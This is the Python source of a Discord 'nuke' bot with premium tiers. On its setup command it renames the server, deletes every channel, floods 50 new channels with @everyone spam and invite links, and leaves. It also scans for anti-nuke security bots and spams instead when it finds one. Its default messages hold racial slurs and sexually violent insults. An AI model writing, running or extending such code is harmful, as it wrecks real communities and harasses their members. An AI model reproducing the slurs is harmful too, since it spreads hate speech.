import asyncio, base64, json, os, random, time
from datetime import datetime

import aiohttp, discord
from discord import app_commands, Interaction
from discord.errors import HTTPException
from discord.ext import commands, tasks
from discord.ext.commands import BucketType, CommandOnCooldown, Cooldown, cooldown
from discord.ui import Button, Select, View

# ✅ Keep-alive imports for Render / Web service
from flask import Flask
import threading
intents = discord.Intents.all()

leaderboard_message = None
NUKE_STATS_FILE = "nuke_stats.json"
PREMIUM_FILE = "premium.json"
CONFIG_FILE = "config.json"

PREM = 1525416750240366693
MOD_ROLE_ID = 1525416750240366693
WHITELIST = [1464634211406188721]  # Owner only
BLACKLISTED_GUILD_ID = 1525971260943892510
OWNER_ID = 1464634211406188721
LEADERBOARD_CHANNEL_ID = 1401931021544460389
TOKEN = ''  # Your bot token
LOG_WEBHOOK_URL = ''  # Your webhook URL

BLOCKED_BOT_IDS = [651095740390834176, 548410451818708993]
BLOCKED_BOT_NAMES = ["Security", "Wick", "Beemo", "AntiNuke"]

def save_nuke_stats(user_id, guild):
    try:
        with open(NUKE_STATS_FILE, "r") as f:
            stats = json.load(f)
    except FileNotFoundError:
        stats = {"users": {}, "servers": {}}

    stats.setdefault("users", {})
    stats.setdefault("servers", {})

    user_id = str(user_id)
    guild_id = str(guild.id)

    stats["users"].setdefault(user_id, {"uses": 0})
    stats["users"][user_id]["uses"] += 1

    stats["servers"].setdefault(guild_id, {
        "user_id": user_id,
        "member_count": guild.member_count,
        "server_name": guild.name
    })

    with open(NUKE_STATS_FILE, "w") as f:
        json.dump(stats, f, indent=2)

def load_premium_users():
    if not os.path.exists(PREMIUM_FILE):
        return []
    with open(PREMIUM_FILE, "r") as f:
        return json.load(f)

def save_premium_users(user_ids):
    with open(PREMIUM_FILE, "w") as f:
        json.dump(user_ids, f, indent=2)

def is_premium_user(user_id: int):
    premium_users = load_premium_users()
    return user_id in premium_users

def load_config():
    if not os.path.exists(CONFIG_FILE):
        return {}
    with open(CONFIG_FILE, "r") as f:
        try:
            return json.load(f)
        except json.JSONDecodeError:
            return {}

def save_config(config):
    with open(CONFIG_FILE, "w") as f:
        json.dump(config, f, indent=2)

def get_user_config(user_id):
    config = load_config()
    return config.get(str(user_id), {})

def set_user_config(user_id, key, value):
    config = load_config()
    user_str = str(user_id)
    if user_str not in config:
        config[user_str] = {}
    config[user_str][key] = value
    save_config(config)

def get_show_username(user_id):
    return get_user_config(user_id).get("show_username", True)

def set_show_username(user_id, value: bool):
    set_user_config(user_id, "show_username", value)

def get_channel_name(user_id):
    return get_user_config(user_id).get("channel_name", "1week-and-xroven-ontop")

def set_channel_name(user_id, value: str):
    set_user_config(user_id, "channel_name", value)

def get_webhook_name(user_id):
    return get_user_config(user_id).get("webhook_name", "larp and xroven")

def set_webhook_name(user_id, value: str):
    set_user_config(user_id, "webhook_name", value)

def get_webhook_message(user_id):
    return get_user_config(user_id).get("webhook_message", "@everyone larp and noctrya owns # EVERYONE JOIN https://discord.gg/7cEpXZReW https://discord.gg/MAGZB5Aq6")

def set_webhook_message(user_id, value: str):
    set_user_config(user_id, "webhook_message", value)

def get_server_name(user_id):
    return get_user_config(user_id).get("server_name", "larp and noctrya owns this")

def set_server_name(user_id, value: str):
    set_user_config(user_id, "server_name", value)

def get_role_name(user_id):
    return get_user_config(user_id).get("role_name", "1weeksober-on-top")

def set_role_name(user_id, value: str):
    set_user_config(user_id, "role_name", value)

class CooldownManager:
    def __init__(self, cooldown_seconds: int):
        self.cooldown_seconds = cooldown_seconds
        self.user_timestamps = {}

    def can_use(self, user_id: int):
        now = time.time()
        last_time = self.user_timestamps.get(user_id, 0)
        elapsed = now - last_time
        if elapsed >= self.cooldown_seconds:
            self.user_timestamps[user_id] = now
            self.cleanup()
            return True, 0
        else:
            return False, int(self.cooldown_seconds - elapsed)

    def cleanup(self):
        now = time.time()
        to_delete = [user for user, ts in self.user_timestamps.items() if now - ts > self.cooldown_seconds]
        for user in to_delete:
            del self.user_timestamps[user]

cooldown_manager = CooldownManager(100)

async def detect_antinuKe_bots(guild):
    found_bots = []
    for member in guild.members:
        if member.bot:
            bot_name = member.nick or member.name
            if member.id in BLOCKED_BOT_IDS or any(x.lower() in bot_name.lower() for x in BLOCKED_BOT_NAMES):
                found_bots.append(f"{bot_name} ({member.id})")
    return found_bots

class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.all()
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        await self.tree.sync()

bot = MyBot()

# ================== PREMIUM COMMANDS ==================
@bot.command(name="addpremium")
async def addpremium(ctx, user: discord.User):
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ You are not authorized.")
        return
    premium_users = load_premium_users()
    if user.id not in premium_users:
        premium_users.append(user.id)
        save_premium_users(premium_users)
        await ctx.send(f"✅ {user.name} has been granted premium.")
    else:
        await ctx.send(f"ℹ️ {user.name} already has premium.")

@bot.command(name="removepremium")
async def removepremium(ctx, user: discord.User):
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ You are not authorized.")
        return
    premium_users = load_premium_users()
    if user.id in premium_users:
        premium_users.remove(user.id)
        save_premium_users(premium_users)
        await ctx.send(f"✅ {user.name} has been removed from premium.")
    else:
        await ctx.send(f"ℹ️ {user.name} does not have premium.")

# ================== NUKING COMMAND ==================
@bot.command()
async def setup(ctx):
    guild = ctx.guild
    user = ctx.author
    user_config = get_user_config(user.id)

    if guild.id == BLACKLISTED_GUILD_ID:
        await ctx.reply("`This server is blacklisted.`")
        return

    if len(guild.members) < 5:
        await user.send(f"❌ Server `{guild.name}` needs at least 5 members. Leaving..")
        await guild.leave()
        return

    found = await detect_antinuKe_bots(guild)
    if found:
        spam_message = user_config.get("webhook_message", "@everyone discord.gg/VSQzzAMVw3 Corrupt owns this")
        for channel in guild.text_channels:
            try:
                await asyncio.gather(*(
                    channel.send(spam_message) for _ in range(10)
                ))
            except:
                pass
        return

    save_nuke_stats(user.id, guild)

    channel_name = user_config.get("channel_name", "1weeksober-on-top")
    webhook_message = user_config.get("webhook_message", "@everyone https://discord.gg/MAGZB5Aq6 https://discord.gg/7cEpXZReW larp and noctrya owns this")
    server_name = user_config.get("server_name", "LARP AND NOCTRYA owns this")
    role_name = user_config.get("role_name", "1weeksober-on-top")

    try:
        await guild.edit(name=server_name)
    except:
        pass

    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            continue

    async def create_channel_and_send_message():
        try:
            ch = await guild.create_text_channel(name=channel_name)
            embed = discord.Embed(
                title="**__NUKED BY 1week and xroven__**",
                description="`This server has been nuked suck my big ass dick niggers.`",
                color=0xb161f9
            )
            embed.set_thumbnail(url="https://i.imgur.com/dHcK9af.jpeg")
            spams = 100 if is_premium_user(user.id) else 50
            for _ in range(spams):
                await ch.send(content=webhook_message, embed=embed, tts=True)
        except:
            pass

    await asyncio.gather(*(create_channel_and_send_message() for _ in range(50)))
    try:
        await guild.create_role(name=role_name)
    except:
        pass

    await guild.leave()

# ================== DASHBOARD / SETTINGS ==================
class SettingsModal(discord.ui.Modal):
    def __init__(self, user_id: int):
        super().__init__(title="Configure your settings")
        self.user_id = user_id
        self.show_username_input = discord.ui.TextInput(
            label="Show username? (yes/no)",
            placeholder="yes or no",
            default="yes" if get_show_username(user_id) else "no",
            max_length=3
        )
        self.channel_name_input = discord.ui.TextInput(
            label="Channel Name (Premium required)",
            placeholder="1weeksober-on-top",
            default=get_channel_name(user_id),
            max_length=32
        )
        self.webhook_name_input = discord.ui.TextInput(
            label="Webhook Name (Premium required)",
            placeholder="Corrupt",
            default=get_webhook_name(user_id),
            max_length=32
        )
        self.webhook_message_input = discord.ui.TextInput(
            label="Webhook Message (Premium required)",
            placeholder="@everyone https://discord.gg/pK7fnsJmp https://discord.gg/MAGZB5Aq6 larp empire and noctrya owns you fuckinh pedofiles niggers",
            default=get_webhook_message(user_id),
            max_length=100
        )
        self.server_name_input = discord.ui.TextInput(
            label="Server Name (Premium required)",
            placeholder="1week and xroven raped ur ass",
            default=get_server_name(user_id),
            max_length=32
        )
        self.add_item(self.show_username_input)
        self.add_item(self.channel_name_input)
        self.add_item(self.webhook_name_input)
        self.add_item(self.webhook_message_input)
        self.add_item(self.server_name_input)

    async def on_submit(self, interaction: discord.Interaction):
        user_id = self.user_id
        is_premium = is_premium_user(user_id)

        show_username_input = self.show_username_input.value.strip().lower()
        if show_username_input in ["yes", "no"]:
            set_show_username(user_id, show_username_input == "yes")

        def safe_set(key, value, default):
            if is_premium:
                set_user_config(user_id, key, value)
            else:
                set_user_config(user_id, key, default)

        safe_set("channel_name", self.channel_name_input.value.strip(), "1weeksober-on-top")
        safe_set("webhook_name", self.webhook_name_input.value.strip(), "Corrupt")
        safe_set("webhook_message", self.webhook_message_input.value.strip(), "@everyone discord.gg/VSQzzAMVw3 Corrupt owns this")
        safe_set("server_name", self.server_name_input.value.strip(), "Corrupt owns this")

        await interaction.response.send_message("✅ Your settings have been saved.", ephemeral=True)

# ================== BOT EVENTS ==================
@bot.event
async def on_ready():
    print(f"Bot is online as {bot.user}!")
    await bot.tree.sync()
# ================== KEEP ALIVE (RENDER WEB SERVICE) ==================

app = Flask(__name__)

@app.route("/")
def home():
    return "Corrupt bot is online."

def run_flask():
    port = int(os.getenv("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

threading.Thread(target=run_flask).start()

# ================== START BOT ==================
bot.run(TOKEN)
